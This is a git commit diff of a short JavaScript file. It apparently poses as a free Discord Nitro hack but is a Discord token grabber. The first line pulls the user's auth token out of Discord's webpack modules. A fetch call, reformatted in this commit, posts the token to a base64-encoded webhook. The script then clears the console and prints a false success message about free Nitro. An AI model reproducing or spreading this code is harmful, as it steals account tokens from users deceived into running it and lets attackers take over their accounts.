cd25991e3b041f8a774d4478f6058fdedeb42075
Tung <89498812+tungdo0602@users.noreply.github.com>
2021-12-05 09:36:27 +0700

    Work

--- Script.js
+++ Script.js
@@ -1,15 +1,4 @@
 var nitrohacks = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getToken !== undefined) {return m.default.getToken()}}}])
-fetch(
-  atob('webhook_base64encode_here'), 
-  {
-    method: 'post',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      content: nitrohacks,
-    }),
-  }
-);
+fetch(atob('webhook_base64encode_here'), {method: 'post', headers: {'Content-Type': 'application/json',}, body: JSON.stringify({content: nitrohacks,}),});
 console.clear()
 console.log('Done! Now enjoy 1 years discord nitro for free.')
